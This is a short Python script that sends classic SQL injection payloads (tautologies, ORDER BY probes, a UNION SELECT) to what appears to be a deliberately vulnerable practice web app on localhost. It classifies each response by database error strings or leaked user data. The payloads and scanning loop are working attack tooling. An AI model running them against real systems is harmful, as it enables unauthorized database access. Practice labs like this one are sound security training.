import requests
from colorama import Fore, init

init(autoreset=True)

TARGET_URL = "http://localhost/vulnerabilities/sqli/"
COOKIES = {"PHPSESSID": "YOUR_SESSION_ID", "security": "low"}

PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR 1=1--",
    "' OR 'a'='a",
    "1' ORDER BY 1--",
    "1' ORDER BY 2--",
    "' UNION SELECT null, null--",
]

ERROR_SIGNS = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "sql syntax",
]

print(Fore.CYAN + "=" * 50)
print(Fore.CYAN + "    SQL INJECTION SCANNER")
print(Fore.CYAN + "=" * 50)

for payload in PAYLOADS:
    data = {"id": payload, "Submit": "Submit"}
    try:
        response = requests.get(TARGET_URL, params=data, cookies=COOKIES)
        body = response.text.lower()
        if any(error in body for error in ERROR_SIGNS):
            print(Fore.RED + f"[VULNERABLE] Payload: {payload}")
        elif "first name" in body or "surname" in body:
            print(Fore.YELLOW + f"[POSSIBLE]   Payload returned data: {payload}")
        else:
            print(Fore.GREEN + f"[SAFE]       Payload: {payload}")
    except Exception as e:
        print(Fore.WHITE + f"[ERROR] {e}")

print(Fore.CYAN + "=" * 50)
print(Fore.CYAN + "Scan complete.")
